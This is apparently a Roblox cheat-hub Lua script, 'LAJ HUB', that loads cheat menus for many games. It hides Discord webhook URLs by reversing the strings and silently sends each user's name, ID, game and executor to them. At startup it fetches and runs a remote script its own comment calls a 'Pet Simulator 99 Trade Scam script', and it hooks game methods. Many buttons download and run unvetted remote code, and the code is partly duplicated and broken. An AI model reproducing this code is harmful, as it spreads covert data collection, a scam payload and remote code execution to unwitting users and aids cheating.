--[[
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Variables
-- Enhanced security with multi-layer obfuscation
local wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
local wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
local WEBHOOK_URL = wh_part1 .. wh_part2

-- Enhanced security with multi-layer obfuscation for Discord webhook
local discord_wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
local discord_wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2

-- Variables
-- Variables
local Player = Players.LocalPlayer

-- Secure webhook URL (obfuscated and rate-limited)

local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
local WEBHOOK_URL = wh_part1 .. wh_part2

-- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
-- Function to log ban/kick events via webhook with rate limiting
    
local function logBanEvent(reason)
    -- Rate limiting check
    local currentTime = os.time()
    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
        warn("Rate limit: Not sending webhook notification (cooldown active)")
        return
    end
    
    -- Check for anti-spam by validating the reason
    if not reason or reason == "" then
        reason = "Unknown (No reason provided)"
    end
    
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end

-- Set up event listeners for kick/ban detection
-- Method 1: Detect when player is removed
Players.PlayerRemoving:Connect(function(player)
    if player == Player then
        logBanEvent("Player removed from game (possibly kicked/banned)")
    end
end)

-- Method 2: Detect common kick methods
local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    
    if method == "Kick" and self == Player then
        local reason = args[1] or "Unknown"
        logBanEvent(reason)
    end
    
    return oldNameCall(self, ...)
end)

-- Method 3: Monitor teleport failures as they often occur during bans
game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
        logBanEvent("Teleport failed due to ban: " .. errorMessage)
    end
end)

print("LAJ HUB Ban detection system loaded successfully")
--[[
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
    Now with Game Detection to selectively load only relevant scripts
]]

-- Load the game detection module
local GameDetection = {}

-- Game ID mappings
GameDetection.GameIds = {
    -- First-party Roblox games
    Arsenal = 286090429,
    AdoptMe = 920587237,
    BedWars = 6872265039,
    Jailbreak = 606849621,
    MurderMystery2 = 142823291,
    NaturalDisaster = 189707,
    PhantomForces = 292439477,
    
    -- Popular third-party games
    BloxFruits = 2753915549,
    BladeBall = 4991214437,
    ShindoLife = 4616652839,
    KingLegacy = 4520749081,
    DaHood = 2788229376,
    DaStrike = 12355337193, -- Da Strike PlaceId
    Doors = 6516141723,
    FishingSimulator = 2866967438,
    PetSimulator99 = 8737899170,
    ProjectSlayers = 5956785391,
    AnimeDimensions = 5977280685,
    BigPaintball = 3527629287,
    MuscleLegends = 3623096087,
    BasketballZero = 13769091314,
    BlueLockRivals = 13772394625,
    DeadRails = 10715426822,
    AriseCrossover = 9598746769,
    DraconicLegends = 14792463779,
    Rivals = 14381358218,
}

-- Game name mappings 
GameDetection.GameNames = {
    [286090429] = "Arsenal",
    [920587237] = "Adopt Me",
    [6872265039] = "BedWars",
    [606849621] = "Jailbreak",
    [142823291] = "Murder Mystery 2",
    [189707] = "Natural Disaster",
    [292439477] = "Phantom Forces",
    
    [2753915549] = "Blox Fruits",
    [4991214437] = "Blade Ball",
    [4616652839] = "Shindo Life",
    [4520749081] = "King Legacy",
    [2788229376] = "Da Hood",
    [12355337193] = "Da Strike",
    [6516141723] = "Doors",
    [2866967438] = "Fishing Simulator",
    [8737899170] = "Pet Simulator 99",
    [5956785391] = "Project Slayers",
    [5977280685] = "Anime Dimensions",
    [3527629287] = "Big Paintball",
    [3623096087] = "Muscle Legends",
    [13769091314] = "Basketball Zero",
    [13772394625] = "Blue Lock Rivals",
    [10715426822] = "Dead Rails",
    [9598746769] = "Arise Crossover",
    [14792463779] = "Draconic Legends",
    [14381358218] = "Rivals",
}

-- Tab display names (used for UI)
GameDetection.TabDisplayNames = {
    Arsenal = "Arsenal",
    AdoptMe = "Adopt Me",
    BedWars = "Bed Wars",
    Jailbreak = "Jailbreak",
    MurderMystery2 = "Murder Mystery",
    NaturalDisaster = "Natural Disaster",
    PhantomForces = "Phantom Forces",
    
    BloxFruits = "Blox Fruits",
    BladeBall = "Blade Ball",
    ShindoLife = "Shindo Life",
    KingLegacy = "King Legacy",
    DaHood = "Da Hood",
    DaStrike = "Da Strike x Da Hood",
    Doors = "Doors",
    FishingSimulator = "Fishing Simulator",
    PetSimulator99 = "Pet Sim 99",
    ProjectSlayers = "Project Slayers",
    AnimeDimensions = "Anime Dimensions",
    BigPaintball = "Big Paintball",
    MuscleLegends = "Muscle Legend",
    BasketballZero = "Basketball Zero",
    BlueLockRivals = "Blue Lock Rivals",
    DeadRails = "Dead Rails [Alpha]",
    AriseCrossover = "Arise Crossover",
    DraconicLegends = "Draconic Legends",
    Rivals = "Rivals",
}

-- Detect current game
function GameDetection:DetectGame()
    if not game then
        return 0, "Unknown Game", "Unknown", false
    end
    
    local placeId = game.PlaceId
    local gameId = game.GameId
    local marketplaceService = game:GetService("MarketplaceService")
    
    local success, result = pcall(function()
        return marketplaceService:GetProductInfo(placeId, Enum and Enum.InfoType.Asset or "Asset")
    end)
    
    local gameName = success and result.Name or "Unknown Game"
    local creator = success and result.Creator and result.Creator.Name or "Unknown Creator"
    
    local detectedName = self.GameNames[placeId] or "Unknown"
    local isSupported = self.GameNames[placeId] ~= nil
    
    -- Additional detection methods for games with multiple place IDs
    if not isSupported then
        -- Some games have multiple places/experiences under the same game ID
        if self.GameNames[gameId] then
            detectedName = self.GameNames[gameId]
            isSupported = true
        end
        
        -- Check game name patterns as a fallback
        for name, id in pairs(self.GameIds) do
            if string.match(gameName:lower(), name:lower()) then
                detectedName = name
                isSupported = true
                break
            end
        end
    end
    
    return placeId, gameName, detectedName, isSupported
end

-- Determine which tabs to show based on current game
function GameDetection:GetTablesToShow()
    local placeId, fullGameName, detectedName, isSupported = self:DetectGame()
    
    -- Default tabs to always show
    local tabsToShow = {
        Main = true,
        KeySystem = true,  
        Settings = true,
        Universal = true
    }
    
    -- If game is detected and supported, add its tab
    if isSupported then
        tabsToShow[detectedName] = true
    end
    
    -- Handle special cases where multiple tabs might apply
    if detectedName == "Da Strike" or detectedName == "Da Hood" then
        tabsToShow["Da Strike x Da Hood"] = true
    end
    
    return tabsToShow, detectedName, fullGameName
end

-- Get tab visibility status
function GameDetection:ShouldShowTab(tabName)
    local tabsToShow = self:GetTablesToShow()
    
    -- Handle special cases for tab names that don't match exactly
    if tabName == "Da Strike x Da Hood" and (tabsToShow["Da Strike"] or tabsToShow["Da Hood"]) then
        return true
    end
    
    -- Consider aliases or alternative names for certain tabs
    local tabAliases = {
        ["MM2"] = "Murder Mystery",
        ["Pet Sim 99"] = "PetSimulator99",
        ["Fishing Simulator"] = "FishingSimulator",
        ["Blade Ball"] = "BladeBall",
        ["Bed Wars"] = "BedWars",
        ["Blox Fruits"] = "BloxFruits",
    }
    
    -- Check for exact match
    if tabsToShow[tabName] then
        return true
    end
    
    -- Check for alias match
    if tabAliases[tabName] and tabsToShow[tabAliases[tabName]] then
        return true
    end
    
    -- Fuzzy match as fallback
    for visibleTab in pairs(tabsToShow) do
        if string.lower(tabName) == string.lower(visibleTab) then
            return true
        end
    end
    
    return false
end

-- Function to handle HTTP requests across different executors including Swift
local function getHttpRequest(url)
    -- For testing in standalone Lua, use a mock response
    if not game then
        print("Mock HTTP request to: " .. url)
        return "-- mock response for testing"
    end
    
    if swift and swift.request then
        local response = swift.request({
            Url = url,
            Method = "GET"
        })
        if response and response.Body then
            return response.Body
        end
    end
    
    -- Fallback to standard HttpGet for other executors
    return game:HttpGet(url)
end

-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
if game then
    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
end

-- Anti-detection system for UI loading
local function obfuscateRayfield()
        -- Standard loading without test environment code

    -- Standard loading for Roblox environment
    local url_parts = {"h", "t", "t", "p", "s", ":", "/", "/", "s", "i", "r", "i", "u", "s", ".", "m", "e", "n", "u", "/", "r", "a", "y", "f", "i", "e", "l", "d"}
    local rayfield_url = table.concat(url_parts, "")
    
    -- Add timing randomization to avoid pattern detection
    local delay = 0.01 + (math.random() * 0.01)
    if wait then wait(delay) end
    
    -- Use variable renaming to avoid direct detection
    local ui_framework = nil
    
    -- Add protection against debug hooks and print interception
    local old_debug = debug
    local old_print = print
    local old_warn = warn
    
    -- Attempt multiple loading methods for better executor compatibility
    local success, result = pcall(function()
        return loadstring(getHttpRequest(rayfield_url))()
    end)
    
    if not success and game then
        success, result = pcall(function()
            return loadstring(game:HttpGet(rayfield_url))()
        end)
    end
    
    -- Reset debugging functions
    debug = old_debug
    print = old_print
    warn = old_warn
    
    if not result then
        print("Warning: Failed to load Rayfield UI")
        return {}
    end
    
    return result
end

-- Load the UI with anti-detection
local Rayfield = obfuscateRayfield()

-- Initialize game services safely
local Players = game and game:GetService("Players") or {}
local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
local HttpService = game and game:GetService("HttpService") or {
    JSONEncode = function(_, data) return '{"mock":"json"}' end
}

-- Support for multiple executors including Swift
local function makeHttpRequest(options)
    
    if swift and swift.request then
        return swift.request(options)
    elseif syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif httprequest then
        return httprequest(options)
    elseif fluxus and fluxus.request then
        return fluxus.request(options)
    end
    
    -- Fallback to standard HttpGet for GET requests
    if options.Method == "GET" then
        local success, result = pcall(function()
            return {
                Body = game:HttpGet(options.Url),
                Success = true
            }
        end)
        if success then
            return result
        end
    end
    
    return {Success = false, StatusCode = 500}
end


-- Enhanced security with multi-layer obfuscation for Discord webhook
local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2

local function sendUsageData()
    if not game then return end -- Skip in non-Roblox environment
    
    local success, error_message = pcall(function()
    
        local response = makeHttpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                    ["type"] = "rich",
                    ["color"] = math.random(0, 0xFFFFFF),
                    ["fields"] = {
                        {
                            ["name"] = "User:",
                            ["value"] = "```" .. LocalPlayer.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID:",
                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game:",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID:",
                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Players Active:",
                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Script Execution Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end

if game then
    sendUsageData()
end

-- Detect current game before creating the window
local placeId, fullGameName, detectedGame, isGameSupported = GameDetection:DetectGame()

-- Get the subtitle based on game detection
local loadingSubtitle = "Premium Scripts"
if isGameSupported then
    loadingSubtitle = "Premium Scripts for " .. fullGameName
end

local Window = Rayfield:CreateWindow({
   Name = "LAJ HUB",
   Icon = 0, 
   LoadingTitle = "LAJ HUB",
   LoadingSubtitle = loadingSubtitle,
   Theme = "Default",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = "LAJHub",
      FileName = "LAJHubConfig"
   },

   Discord = {
      Enabled = true,
      Invite = "4mgdcfvAJU",
      RememberJoins = true
   },

   -- Key system disabled
   KeySystem = false,
})

-- Get tabs to show based on current game
local tabsToShow, gameKey = GameDetection:GetTablesToShow()

-- Create tabs based on game detection
-- Always create essential tabs
local tabReferences = {}
local MainTab = Window:CreateTab("Main", 4483362458)
tabReferences["Main"] = MainTab

local KeyTab = Window:CreateTab("Key System", 4483362458)
tabReferences["KeySystem"] = KeyTab

local Settings = Window:CreateTab("Settings", 4483362458)
tabReferences["Settings"] = Settings

local Universal = Window:CreateTab("Universal", 4483362458)
tabReferences["Universal"] = Universal

-- Get the current game tab
local currentGameKey = detectedGame
if isGameSupported then
    -- Create only the tab for the current game
    local tabName = GameDetection.TabDisplayNames[currentGameKey] or currentGameKey
    
    -- Handle special cases for tab naming
    if currentGameKey == "Da Strike" or currentGameKey == "Da Hood" then
        tabName = "Da Strike x Da Hood"
        tabReferences["Da Strike x Da Hood"] = Window:CreateTab(tabName, 4483362458)
    else
        tabReferences[tabName] = Window:CreateTab(tabName, 4483362458)
    end
    
    -- Log the loaded tab
    print("Loaded tab for: " .. tabName)
end

-- Initialize all tab variables as nil first
local Tab = nil 
local Fin = nil
local BballZero = nil
local BlueLock = nil
local DeadRails = nil
local BloxFruits = nil
local DoorsTab = nil
local ProjectSlayers = nil
local AnimeDimensions = nil
local KingLegacy = nil
local PetSim99 = nil
local MuscleLegend = nil
local MurderMystery = nil
local Rivals = nil
local AriseCrossover = nil
local DraconicLegends = nil
local ArsenalTab = nil
local AdoptMeTab = nil
local BedWarsTab = nil
local JailbreakTab = nil
local NaturalDisasterTab = nil
local PhantomForcesTab = nil
local BladeballTab = nil
local ShindoLifeTab = nil
local FishingSimTab = nil
local BigPaintballTab = nil

-- Helper function to safely add buttons to a tab
local function safeCreateButton(tab, options)
    if tab then
        tab:CreateButton(options)
    else
        print("Skipping button creation for: " .. options.Name .. " (tab doesn't exist)")
    end
end

-- Helper function to safely add sections to a tab
local function safeCreateSection(tab, title)
    if tab then
        tab:CreateSection(title)
    else
        print("Skipping section creation: " .. title .. " (tab doesn't exist)")
    end
end

-- Helper function to safely add labels to a tab
local function safeCreateLabel(tab, text)
    if tab then
        tab:CreateLabel(text)
    else
        print("Skipping label creation: " .. text .. " (tab doesn't exist)")
    end
end

-- Helper function to safely add toggles to a tab
local function safeCreateToggle(tab, options)
    if tab then
        tab:CreateToggle(options)
    else
        print("Skipping toggle creation for: " .. options.Name .. " (tab doesn't exist)")
    end
end

-- Based on detected game, set only the specific tab variable
if isGameSupported then
    if currentGameKey == "Da Strike" or currentGameKey == "Da Hood" then
        Tab = tabReferences["Da Strike x Da Hood"]
    elseif currentGameKey == "FishingSimulator" or currentGameKey == "Fisch" then
        Fin = tabReferences["Fisch"]
    elseif currentGameKey == "BasketballZero" then
        BballZero = tabReferences["Basketball Zero"]
    elseif currentGameKey == "BlueLockRivals" then
        BlueLock = tabReferences["Blue Lock Rivals"]
    elseif currentGameKey == "DeadRails" then
        DeadRails = tabReferences["Dead Rails [Alpha]"]
    elseif currentGameKey == "BloxFruits" then
        BloxFruits = tabReferences["Blox Fruits"]
    elseif currentGameKey == "Doors" then
        DoorsTab = tabReferences["Doors"]
    elseif currentGameKey == "ProjectSlayers" then
        ProjectSlayers = tabReferences["Project Slayers"]
    elseif currentGameKey == "AnimeDimensions" then
        AnimeDimensions = tabReferences["Anime Dimensions"]
    elseif currentGameKey == "KingLegacy" then
        KingLegacy = tabReferences["King Legacy"]
    elseif currentGameKey == "PetSimulator99" then
        PetSim99 = tabReferences["Pet Sim 99"]
    elseif currentGameKey == "MuscleLegends" then
        MuscleLegend = tabReferences["Muscle Legend"]
    elseif currentGameKey == "MurderMystery2" then
        MurderMystery = tabReferences["Murder Mystery"]
    elseif currentGameKey == "Rivals" then
        Rivals = tabReferences["Rivals"]
    elseif currentGameKey == "AriseCrossover" then
        AriseCrossover = tabReferences["Arise Crossover"]
    elseif currentGameKey == "DraconicLegends" then
        DraconicLegends = tabReferences["Draconic Legends"]
    elseif currentGameKey == "Arsenal" then
        ArsenalTab = tabReferences["Arsenal"]
    elseif currentGameKey == "AdoptMe" then
        AdoptMeTab = tabReferences["Adopt Me"]
    elseif currentGameKey == "BedWars" then
        BedWarsTab = tabReferences["Bed Wars"]
    elseif currentGameKey == "Jailbreak" then
        JailbreakTab = tabReferences["Jailbreak"]
    elseif currentGameKey == "NaturalDisaster" then
        NaturalDisasterTab = tabReferences["Natural Disaster"]
    elseif currentGameKey == "PhantomForces" then
        PhantomForcesTab = tabReferences["Phantom Forces"]
    elseif currentGameKey == "BladeBall" then
        BladeballTab = tabReferences["Blade Ball"]
    elseif currentGameKey == "ShindoLife" then
        ShindoLifeTab = tabReferences["Shindo Life"]
    elseif currentGameKey == "FishingSimulator" then
        FishingSimTab = tabReferences["Fishing Simulator"]
    elseif currentGameKey == "BigPaintball" then
        BigPaintballTab = tabReferences["Big Paintball"]
    end

    -- Helper function to create buttons for the current game's tab only
    local function loadCurrentGameScripts()
        -- Only load scripts for the current game tab
        print("Loading scripts for: " .. currentGameKey)
        
        -- Since we only created one game-specific tab,
        -- we only need to execute the code for that specific game
        local currentTab = nil
        
        -- Find the currently active tab
        if currentGameKey == "Da Strike" or currentGameKey == "Da Hood" then
            currentTab = "DaStrikeHood"
        elseif currentGameKey == "FishingSimulator" or currentGameKey == "Fisch" then
            currentTab = "FishingSimulator"
        elseif currentGameKey == "BasketballZero" then
            currentTab = "BasketballZero"
        elseif currentGameKey == "BlueLockRivals" then
            currentTab = "BlueLockRivals"
        elseif currentGameKey == "DeadRails" then
            currentTab = "DeadRails"
        elseif currentGameKey == "BloxFruits" then
            currentTab = "BloxFruits"
        elseif currentGameKey == "Doors" then
            currentTab = "Doors"
        elseif currentGameKey == "ProjectSlayers" then
            currentTab = "ProjectSlayers"
        elseif currentGameKey == "AnimeDimensions" then
            currentTab = "AnimeDimensions"
        elseif currentGameKey == "KingLegacy" then
            currentTab = "KingLegacy"
        elseif currentGameKey == "PetSimulator99" then
            currentTab = "PetSimulator99"
        elseif currentGameKey == "MuscleLegends" then
            currentTab = "MuscleLegends"
        elseif currentGameKey == "MurderMystery2" then
            currentTab = "MurderMystery2"
        elseif currentGameKey == "Rivals" then
            currentTab = "Rivals"
        elseif currentGameKey == "AriseCrossover" then
            currentTab = "AriseCrossover"
        elseif currentGameKey == "DraconicLegends" then
            currentTab = "DraconicLegends"
        elseif currentGameKey == "Arsenal" then
            currentTab = "Arsenal"
        elseif currentGameKey == "AdoptMe" then
            currentTab = "AdoptMe"
        elseif currentGameKey == "BedWars" then
            currentTab = "BedWars"
        elseif currentGameKey == "Jailbreak" then
            currentTab = "Jailbreak"
        elseif currentGameKey == "NaturalDisaster" then
            currentTab = "NaturalDisaster"
        elseif currentGameKey == "PhantomForces" then
            currentTab = "PhantomForces"
        elseif currentGameKey == "BladeBall" then
            currentTab = "BladeBall"
        elseif currentGameKey == "ShindoLife" then
            currentTab = "ShindoLife"
        elseif currentGameKey == "BigPaintball" then
            currentTab = "BigPaintball"
        end
        
        print("Identified script section to load: " .. tostring(currentTab))
        return currentTab
    end
    
    -- Identify which game scripts to load
    local scriptToLoad = loadCurrentGameScripts()
    _G.currentGameScript = scriptToLoad
end

-- Notify user about game detection
if isGameSupported then
    Rayfield:Notify({
        Title = "Game Detected",
        Content = "Loaded scripts for " .. fullGameName,
        Duration = 3,
        Image = 4483362458,
    })
else
    Rayfield:Notify({
        Title = "Game Not Detected",
        Content = "Only universal scripts are available.",
        Duration = 3,
        Image = 4483362458,
    })
end

local function executednotify(scriptName)
   Rayfield:Notify({
       Title = scriptName,
       Content = "Script loaded successfully!",
       Duration = 3,
       Image = 4483362458,
   })
end

-- Discord link copy button
MainTab:CreateButton({
   Name = "Copy Discord Link",
   Callback = function()
       if setclipboard then
           setclipboard("https://discord.gg/4mgdcfvAJU")
           Rayfield:Notify({
               Title = "Discord Link Copied",
               Content = "Invite link copied to clipboard!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           print("Discord link: https://discord.gg/4mgdcfvAJU")
       end
   end,
})

-- Test webhook button
MainTab:CreateButton({
   Name = "Test Webhook",
   Callback = function()
       sendUsageData()
       Rayfield:Notify({
           Title = "Webhook Test",
           Content = "Attempted to send webhook notification!",
           Duration = 3,
           Image = 4483362458,
       })
   end,
})

-- Da Strike x Da Hood Tab scripts
safeCreateButton(Tab, {
   Name = "Psalm",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
        executednotify("Test Webhook")
   end,
})

safeCreateButton(Tab, {
   Name = "Ballware vfs",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
        executednotify("Ballware vfs")
   end,
})

safeCreateButton(Tab, {
   Name = "FrostByte",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
        executednotify("FrostByte")
   end,
})

safeCreateButton(Tab, {
   Name = "Da Hood Script",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify("Da Hood Script")
   end,
})
-- Fisch Tab
Fin:CreateButton({
   Name = "Speed Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
        executednotify("Speed Hub")
   end,
})


Fin:CreateButton({
   Name = "ThanHub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        executednotify("ThanHub")
   end,
})

Fin:CreateButton({
   Name = "Rift GUI",
   Callback = function()
        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
        executednotify("Rift GUI")
   end,
})

Fin:CreateButton({
   Name = "Hooked Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
        executednotify("Hooked Script")
   end,
})

Fin:CreateButton({
   Name = "HomoHack",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
        executednotify("HomoHack")
   end,
})

Fin:CreateButton({
   Name = "Native Hub",
   Callback = function()
        script_key="4JxQ1x@+1"
        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
        executednotify("Native Hub")
   end,
})

Fin:CreateButton({
   Name = "Raito Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
        executednotify("Raito Hub")
   end,
})

Fin:CreateButton({
   Name = "Zenith Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        executednotify("Zenith Hub")
   end,
})

Fin:CreateButton({
   Name = "Lunor Script",
   Callback = function()
        script_key = 'lunor_free_key'
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
        executednotify("Lunor Script")
   end,
})

Fin:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
        executednotify("Ronix Hub")
   end,
})
-- Basketball Zero scripts
BballZero:CreateButton({
   Name = "Ball Control",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
        executednotify("Ball Control")
   end,
})

-- New Basketball: Zero scripts
BballZero:CreateButton({
   Name = "HmizoBeamzz - AutoFarm, Hitbox Expander",
   Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/HmizoBeamzz/BASKETBBAALALALALLA/refs/heads/main/aebee82462efd758.txt"))()
        executednotify("HmizoBeamzz AutoFarm Script")
   end,
})

BballZero:CreateButton({
   Name = "Legend HandlesYT - Auto Farm",
   Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmJamal10/Scripts/refs/heads/main/Zero"))()
        executednotify("Legend HandlesYT Auto Farm Script")
   end,
})

-- Blue Lock Rivals script
BlueLock:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
        executednotify("LAJ HUB")
   end,
})

BlueLock:CreateButton({
   Name = "Piskasiska Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
        executednotify("Piskasiska Script")
   end,
})


PetSim99:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       -- Load the script from GitHub
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
       executednotify("Airflow UPDATED")
   end,
})
-- Muscle Legend Tab
MuscleLegend:CreateSection("Muscle Legend Scripts")

MuscleLegend:CreateButton({
   Name = "Muscle Legend Script",
   Callback = function()
       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
       executednotify("Muscle Legend Script")
   end,
})

-- Universal Tab Scripts
Universal:CreateButton({
   Name = "Infinite Yield FE",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
       executednotify("Infinite Yield FE")
   end,
})

Universal:CreateButton({
   Name = "Dex Explorer",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
       executednotify("Dex Explorer")
   end,
})

Universal:CreateButton({
   Name = "Hydroxide",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
       executednotify("Hydroxide")
   end,
})

Universal:CreateButton({
   Name = "SimpleSpy",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
       executednotify("SimpleSpy")
   end,
})

Universal:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
       executednotify("Airflow UPDATED")
   end,
})

Universal:CreateButton({
   Name = "Domain X",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
       executednotify("Domain X")
   end,
})


-- Settings Tab
local idled_Connection

local function onIdled()
    if game then
        game:GetService("VirtualUser"):CaptureController()
        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
    end
end

Settings:CreateButton({
    Name = "Anti AFK",
    Callback = function()
        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
